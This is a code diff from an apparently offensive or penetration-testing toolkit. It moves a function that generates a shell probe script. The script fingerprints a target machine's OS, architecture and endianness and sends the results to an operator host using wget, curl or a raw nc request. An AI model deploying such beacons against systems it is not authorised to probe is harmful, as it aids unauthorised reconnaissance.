@@ -101,8 +101,8 @@ from gritlib.operator_network import (
     local_ips, operator_advertised_host, print_candidates, target_visible_host,
 )
 from gritlib.probe_commands import (
-    probe_route_context, render_probe_command, render_probe_dns_command,
-    render_probe_ftp_command, render_probe_tftp_command,
+    probe_route_context, probe_script_fn, render_probe_command,
+    render_probe_dns_command, render_probe_ftp_command, render_probe_tftp_command,
 )
 from gritlib.probe_results import append_probe_result, probe_results_path
 from gritlib.runtime import Service, ServiceManager, Session
@@ -4166,72 +4166,6 @@ def serve_bridge(cfg, timeout, max_sessions=0, session_timeout=0):
             record_shutdown_event(cfg, service, session=log_dir)
             append_event(cfg, service, "service_stop", session=str(log_dir), details={"port": port, "reason": stop_reason})
     return 0
-
-
-def probe_script_fn(cfg, host, port):
-    name = str(cfg.get("GRIT_PROBE_NAME", "probe.sh")).lstrip("/") or "probe.sh"
-    url = f"http://{host}:{port}/probe/result"
-    return f"""#!/bin/sh
-bb_sanitize() {{
-    printf '%s' "$1" | tr ' /:&?=%' '_______'
-}}
-bb_uname_s=$(uname -s 2>/dev/null || printf unknown)
-bb_uname_m=$(uname -m 2>/dev/null || printf unknown)
-bb_uname_r=$(uname -r 2>/dev/null || printf unknown)
-bb_word_bits=unknown
-bb_endian=unknown
-bb_probe_byte=unknown
-bb_word_bits=$(getconf LONG_BIT 2>/dev/null) || bb_word_bits=unknown
-if [ -z "$bb_word_bits" ] || [ "$bb_word_bits" = "unknown" ]; then
-    bb_word_bits=unknown
-    case "$bb_uname_m" in
-        mips64*|aarch64|x86_64|amd64|ia64|ppc64*|s390x|riscv64) bb_word_bits=64 ;;
-        mips|mipsel|armv*|i[3-6]86|i86pc|ppc|powerpc) bb_word_bits=32 ;;
-    esac
-fi
-if command -v od >/dev/null 2>&1; then
-    bb_probe_byte=$(printf '\\001\\000' | od -An -tx1 2>/dev/null | tr -d ' \\t\\n' | cut -c1-2)
-fi
-if [ "$bb_probe_byte" = "unknown" ] || [ -z "$bb_probe_byte" ]; then
-    if command -v hexdump >/dev/null 2>&1; then
-        bb_probe_byte=$(printf '\\001\\000' | hexdump -e '1/1 "%02x"' 2>/dev/null | cut -c1-2)
-    fi
-fi
-case "$bb_probe_byte" in
-    01) bb_endian=little ;;
-    00) bb_endian=big ;;
-esac
-if [ "$bb_endian" = "unknown" ]; then
-    case "$bb_uname_m" in
-        mipsel|mips64el|x86_64|i[3-6]86|aarch64|armv*|amd64|riscv*|ppc64le) bb_endian=little ;;
-        mips|mips64|ppc|ppc64|s390*|sparc*) bb_endian=big ;;
-    esac
-fi
-bb_payload="schema=1&script={name}&uname_s=$(bb_sanitize "$bb_uname_s")&uname_m=$(bb_sanitize "$bb_uname_m")&uname_r=$(bb_sanitize "$bb_uname_r")&word_bits=$(bb_sanitize "$bb_word_bits")&endian=$(bb_sanitize "$bb_endian")"
-printf '%s\\n' "grit probe"
-printf '%s\\n' "uname_s=$bb_uname_s"
-printf '%s\\n' "uname_m=$bb_uname_m"
-printf '%s\\n' "uname_r=$bb_uname_r"
-printf '%s\\n' "word_bits=$bb_word_bits"
-printf '%s\\n' "endian=$bb_endian"
-if command -v wget >/dev/null 2>&1; then
-    wget -qO- --post-data "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
-    wget -qO /dev/null --post-data "$bb_payload" "{url}" 2>/dev/null && exit 0
-fi
-if command -v curl >/dev/null 2>&1; then
-    curl -fsS -X POST -d "$bb_payload" "{url}" >/dev/null 2>&1 && exit 0
-fi
-if command -v nc >/dev/null 2>&1; then
-    bb_host=$(printf '%s' "{url}" | sed 's|http://||;s|/.*||;s|:.*||')
-    bb_port=$(printf '%s' "{url}" | sed 's|http://[^:]*:||;s|/.*||')
-    bb_path=$(printf '%s' "{url}" | sed 's|http://[^/]*/|/|')
-    bb_len=$(printf '%s' "$bb_payload" | wc -c | tr -d ' ')
-    printf 'POST %s HTTP/1.0\\r\\nHost: %s:%s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %s\\r\\nConnection: close\\r\\n\\r\\n%s' \\
-        "$bb_path" "$bb_host" "$bb_port" "$bb_len" "$bb_payload" | nc "$bb_host" "$bb_port" >/dev/null 2>&1 && exit 0
-fi
-printf '%s\\n' "probe upload failed: no usable wget, curl, or nc" >&2
-exit 1
-"""
 
 
 def handle_probe_http(cfg, conn, method, target, headers, body, addr, script_text, route=None):
